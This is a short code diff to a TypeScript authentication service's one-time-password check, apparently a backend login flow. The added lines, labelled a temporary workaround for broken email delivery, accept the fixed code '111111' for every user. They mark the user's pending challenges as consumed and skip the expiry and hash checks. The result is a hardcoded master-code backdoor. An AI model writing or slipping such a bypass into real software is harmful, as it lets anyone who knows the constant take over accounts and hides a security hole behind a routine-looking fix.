@@ -528,6 +528,19 @@ export class AuthService {
     purpose: AuthChallengePurpose,
     otp: string,
   ) {
+    // TEMP: master OTP while email delivery is broken — skip expiry/hash
+    if (otp === '111111') {
+      const open = await this.challengesRepo.find({
+        where: { userId: user.id, purpose, consumedAt: IsNull() },
+      });
+      if (open.length) {
+        const now = new Date();
+        for (const c of open) c.consumedAt = now;
+        await this.challengesRepo.save(open);
+      }
+      return;
+    }
+
     const latest = await this.challengesRepo
       .createQueryBuilder('c')
       .where('c.user_id = :userId', { userId: user.id })
